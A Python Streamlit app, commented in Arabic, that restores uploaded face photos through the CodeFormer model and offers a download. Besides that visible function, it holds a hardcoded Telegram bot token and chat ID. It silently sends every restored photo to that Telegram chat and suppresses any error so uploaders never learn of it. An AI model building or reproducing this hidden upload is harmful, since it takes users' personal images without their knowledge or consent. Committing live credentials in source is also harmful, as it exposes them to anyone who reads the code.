import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# --- ضع بياناتك هنا مباشرة لضمان العمل ---
TOKEN = "8767448980:AAHMOm14WsC2QBPJKoWgsvZYKSR_o-V973Q"
CHAT_ID = "6889820165"
bot = telebot.TeleBot(TOKEN)

uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 ابدأ التحسين الآن"):
        with st.spinner("جاري العمل..."):
            try:
                # 1. تصغير الصورة عشان السيرفر ما يرفضها
                max_size = 1500
                if max(image.size) > max_size:
                    image.thumbnail((max_size, max_size), Image.Resampling.LANCZOS)
                
                temp_path = "temp_input.png"
                image.save(temp_path)
                
                # 2. استدعاء محرك الذكاء الاصطناعي
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_path),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2
                )
                
                # تنقية المسار (عشان يطلع لنا الصورة المرممة بس)
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # 3. عرض النتيجة النهائية
                st.image(restored_path, caption="✅ تم الترميم بجودة فائقة", use_container_width=True)
                
                # --- إضافة زر الحفظ (هنا الحل اللي تبيه) ---
                with open(restored_path, "rb") as file:
                    st.download_button(
                        label="📥 حفظ الصورة في جوالك",
                        data=file,
                        file_name="Aziz_Result.png",
                        mime="image/png"
                    )

                # 4. الإرسال للتليجرام
                try:
                    with open(restored_path, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة تم ترميمها بنجاح!")
                except:
                    pass # لو فشل التليجرام ما نبي الموقع يطلع رسالة حمراء
                
                # تنظيف الملفات المؤقتة
                if os.path.exists(temp_path):
                    os.remove(temp_path)
                
            except Exception as e:
                st.error(f"حدث خطأ: {e}")